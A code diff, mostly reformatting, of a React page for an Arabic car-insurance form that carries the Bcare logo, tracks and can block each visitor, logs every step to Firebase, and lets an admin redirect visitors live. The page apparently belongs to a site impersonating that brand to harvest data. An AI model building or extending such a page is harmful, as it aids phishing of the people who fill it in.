@@ -1,100 +1,89 @@
-"use client"
+"use client";
 
-import { useEffect, useState } from "react"
-import { useRouter } from "next/navigation"
-import { Button } from "@/components/ui/button"
-import { Input } from "@/components/ui/input"
-import { Globe } from 'lucide-react'
-import { FullPageLoader } from "@/components/loader"
-import { StepIndicator } from "@/components/step-indicator"
-import { getOrCreateVisitorID, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
-import { useAutoSave } from "@/hooks/use-auto-save"
-import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
-import { addData, saveToHistory } from "@/lib/firebase"
-import { translations } from "@/lib/translations"
+import { useEffect, useState } from "react";
+import { useRouter } from "next/navigation";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Globe } from "lucide-react";
+import { FullPageLoader } from "@/components/loader";
+import {
+  getOrCreateVisitorID,
+  updateVisitorPage,
+  checkIfBlocked,
+} from "@/lib/visitor-tracking";
+import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
+import { addData, saveToHistory } from "@/lib/firebase";
 
 export default function InsurancePage() {
-  const router = useRouter()
-  const [visitorID] = useState(() => getOrCreateVisitorID())
-  const [loading, setLoading] = useState(true)
-  const [isBlocked, setIsBlocked] = useState(false)
-  
+  const router = useRouter();
+  const [visitorID] = useState(() => getOrCreateVisitorID());
+  const [loading, setLoading] = useState(true);
+  const [isBlocked, setIsBlocked] = useState(false);
+
   // Form fields
-  const [insuranceCoverage, setInsuranceCoverage] = useState("")
-  const [insuranceStartDate, setInsuranceStartDate] = useState("")
-  const [vehicleUsage, setVehicleUsage] = useState("")
-  const [vehicleValue, setVehicleValue] = useState("")
-  const [vehicleYear, setVehicleYear] = useState("")
-  const [vehicleModel, setVehicleModel] = useState("")
-  const [repairLocation, setRepairLocation] = useState("agency")
-  
+  const [insuranceCoverage, setInsuranceCoverage] = useState("");
+  const [insuranceStartDate, setInsuranceStartDate] = useState("");
+  const [vehicleUsage, setVehicleUsage] = useState("");
+  const [vehicleValue, setVehicleValue] = useState("");
+  const [vehicleYear, setVehicleYear] = useState("");
+  const [vehicleModel, setVehicleModel] = useState("");
+  const [repairLocation, setRepairLocation] = useState("agency");
+
   // Language
-  const [language, setLanguage] = useState<"ar" | "en">("ar")
-  
-  // Auto-save all form data
-  useAutoSave({
-    visitorId: visitorID,
-    pageName: "insur",
-    data: {
-      insuranceCoverage,
-      insuranceStartDate,
-      vehicleUsage,
-      vehicleValue,
-      vehicleYear,
-      vehicleModel,
-      repairLocation
-    }
-  })
-  
+  const [language, setLanguage] = useState<"ar" | "en">("ar");
+
   // Monitor redirect requests from admin
   useRedirectMonitor({
     visitorId: visitorID,
-    currentPage: "insur"
-  })
-  
+    currentPage: "insur",
+  });
+
   // Initialize on mount
   useEffect(() => {
     const init = async () => {
-      const blocked = await checkIfBlocked(visitorID)
+      const blocked = await checkIfBlocked(visitorID);
       if (blocked) {
-        setIsBlocked(true)
-        setLoading(false)
-        return
+        setIsBlocked(true);
+        setLoading(false);
+        return;
       }
-      
-      await updateVisitorPage(visitorID, "insur", 2)
-      setLoading(false)
-    }
-    
-    init()
-  }, [visitorID])
-  
+
+      await updateVisitorPage(visitorID, "insur", 2);
+      setLoading(false);
+    };
+
+    init();
+  }, [visitorID]);
+
   // Handle vehicle value input - numbers only
   const handleVehicleValueChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/[^0-9]/g, '') // Remove non-numeric characters
-    if (value === '' || (parseInt(value) >= 10000 && parseInt(value) <= 1000000)) {
-      setVehicleValue(value)
+    const value = e.target.value.replace(/[^0-9]/g, ""); // Remove non-numeric characters
+    if (
+      value === "" ||
+      (parseInt(value) >= 10000 && parseInt(value) <= 1000000)
+    ) {
+      setVehicleValue(value);
     } else if (parseInt(value) < 10000) {
-      setVehicleValue(value) // Allow typing but will validate on submit
+      setVehicleValue(value); // Allow typing but will validate on submit
     }
-  }
-  
+  };
+
   // Handle form submit
   const handleSecondStepSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    
+    e.preventDefault();
+
     // Validate vehicle value
-    const valueNum = parseInt(vehicleValue)
+    const valueNum = parseInt(vehicleValue);
     if (valueNum < 10000 || valueNum > 1000000) {
-      alert('قيمة المركبة يجب أن تكون بين 10,000 و 1,000,000 ريال')
-      return
+      alert("قيمة المركبة يجب أن تكون بين 10,000 و 1,000,000 ريال");
+      return;
     }
-    
-    setLoading(true)
-    
+
+    setLoading(true);
+
     // Save current data to history before updating
-    await saveToHistory(visitorID, 2)
-    
+    await saveToHistory(visitorID, 2);
+
     await addData({
       id: visitorID,
       insuranceCoverage,
@@ -106,61 +95,78 @@ export default function InsurancePage() {
       repairLocation,
       currentStep: 3,
       currentPage: "compar",
-      insurCompletedAt: new Date().toISOString()
+      insurCompletedAt: new Date().toISOString(),
     }).then(() => {
       // Wait 1.5 seconds before moving to next step
       setTimeout(() => {
-        setLoading(false)
-        router.push('/compar')
-      }, 1500)
-    })
-  }
-  
+        setLoading(false);
+        router.push("/compar");
+      }, 1500);
+    });
+  };
+
   if (loading) {
-    return <FullPageLoader />
+    return <FullPageLoader />;
   }
-  
+
   if (isBlocked) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-gray-50">
         <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
-          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
+          <h1 className="text-2xl font-bold text-red-600 mb-4">
+            تم حظر الوصول
+          </h1>
           <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
-          <p className="text-gray-600 mt-2">للمزيد من المعلومات، يرجى التواصل مع الدعم الفني.</p>
+          <p className="text-gray-600 mt-2">
+            للمزيد من المعلومات، يرجى التواصل مع الدعم الفني.
+          </p>
         </div>
       </div>
-    )
+    );
   }
-  
+
   // Generate years from 2000 to 2026
-  const years = Array.from({ length: 27 }, (_, i) => 2026 - i) // 2026 down to 2000
-  
+  const years = Array.from({ length: 27 }, (_, i) => 2026 - i); // 2026 down to 2000
+
   return (
     <div className="min-h-screen bg-white">
       {/* Header */}
       <div className="px-3 py-3 md:px-6 md:py-4 flex items-center justify-between border-b border-slate-200 bg-white">
-        <button 
+        <button
           onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
           className="flex items-center gap-1.5 px-3 py-2 md:px-4 md:py-2.5 bg-white/95 rounded-lg hover:bg-white transition-colors shadow-md"
         >
           <Globe className="w-4 h-4 md:w-5 md:h-5 text-[#0a4a68]" />
-          <span className="text-[#0a4a68] font-semibold text-sm md:text-base">{language === "ar" ? "EN" : "AR"}</span>
+          <span className="text-[#0a4a68] font-semibold text-sm md:text-base">
+            {language === "ar" ? "EN" : "AR"}
+          </span>
         </button>
         <div className="bg-white rounded-2xl px-3 py-2 shadow-lg">
-          <img src="/Bcare-logo.svg" alt="BeCare" className="h-7 md:h-8 w-auto" />
+          <img
+            src="/Bcare-logo.svg"
+            alt="BeCare"
+            className="h-7 md:h-8 w-auto"
+          />
         </div>
       </div>
-
 
       {/* Main Content */}
       <div className="max-w-3xl mx-auto pt-6 md:pt-10 px-3 md:px-4 pb-6 md:pb-8">
         <div className="bg-white rounded-xl md:rounded-2xl shadow-xl overflow-hidden">
           <div className="p-4 md:p-6 lg:p-8">
-            <h2 className="text-2xl md:text-3xl font-bold text-[#0a4a68] mb-6 md:mb-8 text-center">بيانات التأمين</h2>
+            <h2 className="text-2xl md:text-3xl font-bold text-[#0a4a68] mb-6 md:mb-8 text-center">
+              بيانات التأمين
+            </h2>
 
-            <form onSubmit={handleSecondStepSubmit} className="space-y-4 md:space-y-5" dir={language === "ar" ? "rtl" : "ltr"}>
+            <form
+              onSubmit={handleSecondStepSubmit}
+              className="space-y-4 md:space-y-5"
+              dir={language === "ar" ? "rtl" : "ltr"}
+            >
               <div className="space-y-2">
-                <label className="block text-gray-700 font-semibold text-base md:text-lg">نوع التأمين</label>
+                <label className="block text-gray-700 font-semibold text-base md:text-lg">
+                  نوع التأمين
+                </label>
                 <select
                   value={insuranceCoverage}
                   onChange={(e) => setInsuranceCoverage(e.target.value)}
@@ -174,15 +180,17 @@ export default function InsurancePage() {
               </div>
 
               <div className="space-y-2">
-                <label className="block text-gray-700 font-semibold text-base md:text-lg">تاريخ بدء التأمين</label>
+                <label className="block text-gray-700 font-semibold text-base md:text-lg">
+                  تاريخ بدء التأمين
+                </label>
                 <input
                   type="date"
                   value={insuranceStartDate}
                   onChange={(e) => setInsuranceStartDate(e.target.value)}
                   className="w-full h-11 md:h-12 text-right text-base md:text-lg border-2 rounded-lg md:rounded-xl px-3 md:px-4 bg-white focus:border-[#0a4a68] focus:outline-none shadow-sm cursor-pointer text-gray-900 font-medium"
                   style={{
-                    colorScheme: 'light',
-                    direction: 'rtl'
+                    colorScheme: "light",
+                    direction: "rtl",
                   }}
                   required
                 />
@@ -226,11 +234,15 @@ export default function InsurancePage() {
                   min="10000"
                   max="1000000"
                 />
-                <p className="text-sm text-gray-500 text-right">القيمة يجب أن تكون بين 10,000 و 1,000,000 ريال</p>
+                <p className="text-sm text-gray-500 text-right">
+                  القيمة يجب أن تكون بين 10,000 و 1,000,000 ريال
+                </p>
               </div>
 
               <div className="space-y-2">
-                <label className="block text-gray-700 font-semibold text-base md:text-lg">سنة صنع المركبة</label>
+                <label className="block text-gray-700 font-semibold text-base md:text-lg">
+                  سنة صنع المركبة
+                </label>
                 <select
                   value={vehicleYear}
                   onChange={(e) => setVehicleYear(e.target.value)}
@@ -247,7 +259,9 @@ export default function InsurancePage() {
               </div>
 
               <div className="space-y-2">
-                <label className="block text-gray-700 font-semibold text-base md:text-lg">ماركة وموديل السيارة</label>
+                <label className="block text-gray-700 font-semibold text-base md:text-lg">
+                  ماركة وموديل السيارة
+                </label>
                 <Input
                   placeholder="مثال: تويوتا كامري 2023"
                   value={vehicleModel}
@@ -259,7 +273,9 @@ export default function InsurancePage() {
               </div>
 
               <div className="space-y-2">
-                <label className="block text-gray-700 font-semibold text-base md:text-lg">مكان اصلاح المركبة</label>
+                <label className="block text-gray-700 font-semibold text-base md:text-lg">
+                  مكان اصلاح المركبة
+                </label>
                 <div className="space-y-2 md:space-y-3">
                   <label className="flex items-center gap-2 md:gap-3 p-3 md:p-4 border-2 rounded-lg md:rounded-xl cursor-pointer hover:bg-gray-50 transition-colors">
                     <input
@@ -270,7 +286,9 @@ export default function InsurancePage() {
                       onChange={(e) => setRepairLocation(e.target.value)}
                       className="w-4 h-4 md:w-5 md:h-5 text-blue-600 focus:ring-2 focus:ring-blue-500"
                     />
-                    <span className="text-sm md:text-base font-medium">الوكالة</span>
+                    <span className="text-sm md:text-base font-medium">
+                      الوكالة
+                    </span>
                   </label>
                   <label className="flex items-center gap-2 md:gap-3 p-3 md:p-4 border-2 rounded-lg md:rounded-xl cursor-pointer hover:bg-gray-50 transition-colors">
                     <input
@@ -281,7 +299,9 @@ export default function InsurancePage() {
                       onChange={(e) => setRepairLocation(e.target.value)}
                       className="w-4 h-4 md:w-5 md:h-5 text-blue-600 focus:ring-2 focus:ring-blue-500"
                     />
-                    <span className="text-sm md:text-base font-medium">الورشة</span>
+                    <span className="text-sm md:text-base font-medium">
+                      الورشة
+                    </span>
                   </label>
                 </div>
               </div>
@@ -296,8 +316,6 @@ export default function InsurancePage() {
           </div>
         </div>
       </div>
-
-
     </div>
-  )
+  );
 }
